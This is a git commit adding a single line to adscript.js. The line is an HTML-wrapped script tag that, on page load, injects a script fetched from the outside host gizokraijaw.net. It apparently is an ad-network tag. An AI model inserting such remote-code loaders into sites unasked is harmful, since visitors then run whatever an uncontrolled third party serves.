2f54819c65eb2eafc9fe6a2844cbba2aec662737
t0bby-ike <98056031+t0bby-ike@users.noreply.github.com>
2025-06-13 00:57:03 +0100

    Update adscript.js

---
+++ adscript.js
@@ -0,0 +1,1 @@
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9369964,document.createElement('script'))</script>
